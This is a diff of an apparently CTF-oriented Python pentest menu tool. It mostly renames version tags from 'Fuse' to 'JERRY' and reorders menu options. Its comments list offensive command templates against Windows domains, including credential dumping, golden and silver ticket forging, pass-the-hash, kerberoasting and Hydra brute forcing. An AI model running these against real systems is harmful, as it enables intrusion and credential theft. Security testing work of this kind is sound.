@@ -9,7 +9,7 @@
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse                                                                
+# Version : JERRY                                                                
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -31,7 +31,7 @@ colour3 = 'white'
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Fuse                                                                
+# Version : JERRY                                                                
 # Details : Conduct simple and routine tests on user supplied arguements.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -45,7 +45,7 @@ BUG = 0				# BUGHUNT ON/OFF
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Fuse
+# Version : JERRY
 # Details : Create functional calls from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -286,22 +286,22 @@ def display():
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
 
 def options():
-   print('\u2551' + "(0) REMOTE IP Scanner (10) Re/Set SHARENAME (20) Get Arch (30) Enum4Linux     (40) Kerb User Info  (50) Golden PAC   (60) GenSSHKeyID (70) GoBuster  (80) SQSH IP  " + '\u2551')
-   print('\u2551' + "(1) Re/Set DNS SERVER (11) Re/Set CLOCKTIME (21) Net View (31) WinDap Search  (41) Kerb UserFilter (51) Domain Dump  (61) GenUSERList (71)           (81) SSH IP   " + '\u2551')
-   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) GenPassList (72)           (82) SSH ID IP" + '\u2551')
-   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) ACLPwn       (63) USER Editor (73)           (83) MySQL IP " + '\u2551')
-   print('\u2551' + "(4) Re/Set WEBADDRESS (14) Check DNS Record (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) Secrets Dump (64) PASS Editor (74)           (84) Telnet IP" + '\u2551')
-   print('\u2551' + "(5) Re/Set USERNAME   (15) Check DNS Server (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) HOST Editor (75)           (85) Netcat IP" + '\u2551')
-   print('\u2551' + "(6) Re/Set PASSWORD   (16) FScan LIVE PORTS (26) SmbExec  (36) SmbClient      (46) Pass the HASH   (56) PSExec HASH  (66) Hydra FTP   (76) FTP IP    (86) EvilWinRm" + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH  (17) DScan LIVE PORTS (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67) Hydra SSH   (77) TFPS IP   (87) RDesktop " + '\u2551')
-   print('\u2551' + "(8) Re/Set DOMAINNAME (18) Fuzz SubDOMAINS  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68) Hydra SMB   (78) SFTP IP   (88) XFreeRDP " + '\u2551')
-   print('\u2551' + "(9) Re/Set DOMAINSID  (19) Server ClockTime (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69) Hydra TOM   (79) PFTP IP   (89) Save/Exit" + '\u2551')
+   print('\u2551' + "(0) REMOTE IP Scanner (10) Re/Set SHARENAME (20) Get Arch (30) Enum4Linux     (40) Kerb User Info  (50) Golden PAC   (60) GenSSHKeyID (70) MSF TOM  (80) SQSH IP   " + '\u2551')
+   print('\u2551' + "(1) Re/Set DNS SERVER (11) Re/Set CLOCKTIME (21) Net View (31) WinDap Search  (41) Kerb UserFilter (51) Domain Dump  (61) GenUSERList (71)          (81) SSH IP    " + '\u2551')
+   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) BloodHound   (62) GenPassList (72)          (82) SSH ID IP " + '\u2551')
+   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Check Connection (23) AtExec   (33) SamDump Users  (43) Kerb Roasting   (53) ACLPwn       (63) USER Editor (73)          (83) MySQL IP  " + '\u2551')
+   print('\u2551' + "(4) Re/Set WEBADDRESS (14) Check DNS Record (24) DcomExec (34) RpcDump        (44) Kerb ASREPRoast (54) Secrets Dump (64) PASS Editor (74)          (84) Telnet IP " + '\u2551')
+   print('\u2551' + "(5) Re/Set USERNAME   (15) Check DNS Server (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) HOST Editor (75) GoBuster (85) Netcat IP " + '\u2551')
+   print('\u2551' + "(6) Re/Set PASSWORD   (16) FScan LIVE PORTS (26) SmbExec  (36) SmbClient      (46) Pass the HASH   (56) PSExec HASH  (66) Hydra FTP   (76) FTP IP   (86) EvilWinRm " + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH  (17) DScan LIVE PORTS (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67) Hydra SSH   (77) TFPS IP  (87) RDesktop  " + '\u2551')
+   print('\u2551' + "(8) Re/Set DOMAINNAME (18) Fuzz SubDOMAINS  (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68) Hydra SMB   (78) SFTP IP  (88) XFreeRDP  " + '\u2551')
+   print('\u2551' + "(9) Re/Set DOMAINSID  (19) Server ClockTime (29) OpDump   (39) RpcClient      (49) Golden Ticket   (59) GPP Decrypt  (69) Hydra TOM   (79) PFTP IP  (89) Save/Exit " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse                                                                
+# Version : JERRY                                                                
 # Details : Display my universal header.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -318,7 +318,7 @@ print("BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS).	     \n")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Fuse
+# Version : JERRY
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -361,7 +361,7 @@ PASS = [" "*COL4]*MAXX	# PASSWORDS
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Fuse
+# Version : JERRY
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -411,7 +411,7 @@ if len(DIR) < COL1: DIR = padding(DIR, COL1)
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Fuse
+# Version : JERRY
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -427,7 +427,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -566,7 +566,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -587,7 +587,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -612,7 +612,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the remote port ranges.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -633,7 +633,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the web address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -651,7 +651,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -672,7 +672,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -690,7 +690,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -708,7 +708,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -734,7 +734,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -752,7 +752,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -770,7 +770,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -789,7 +789,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -811,7 +811,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -827,7 +827,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -860,7 +860,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -875,7 +875,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -904,7 +904,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -924,7 +924,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -947,7 +947,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -963,7 +963,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - getArch.py -target IP
 # Details : 32/64 bit
 # Modified: N/A
@@ -977,7 +977,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1000,7 +1000,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1023,7 +1023,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1046,7 +1046,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1068,7 +1068,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1092,7 +1092,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1115,7 +1115,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1138,7 +1138,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1151,7 +1151,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1165,7 +1165,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
 # Details : Anonymous login check.
 # Modified: N/A
@@ -1180,7 +1180,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1203,7 +1203,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1289,7 +1289,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1341,7 +1341,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1364,7 +1364,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
@@ -1388,7 +1388,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1430,7 +1430,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1453,7 +1453,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1469,7 +1469,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1492,7 +1492,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1515,7 +1515,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1568,7 +1568,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
 # -------------------------------------------------------------------------------------
@@ -1638,7 +1638,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1667,7 +1667,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1696,7 +1696,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1718,7 +1718,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
@@ -1757,7 +1757,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1769,8 +1769,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
-# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Fuse
+# Version : JERRY
+# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/JERRY
 # Details : Silver Ticket!! 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1805,7 +1805,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Details : Golden Ticket!!
 # Modified: N/A
@@ -1841,7 +1841,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1865,7 +1865,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1890,7 +1890,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1913,7 +1913,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1941,7 +1941,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.   if PAS[:2] != "''":
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2012,7 +2012,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2060,7 +2060,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2084,7 +2084,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - domain/username:password@<targetName or address
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2108,7 +2108,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2132,7 +2132,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - gpp AES256 Cracker
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2146,7 +2146,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2167,7 +2167,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2202,7 +2202,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2233,7 +2233,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Nano usernames.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2248,7 +2248,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Nano passwords.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2260,7 +2260,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2272,7 +2272,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - HYDRA BRUTE FORCE FTP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2314,7 +2314,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - HYDRA BRUTE FORCE SSH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2356,7 +2356,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - HYDRA SMB BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
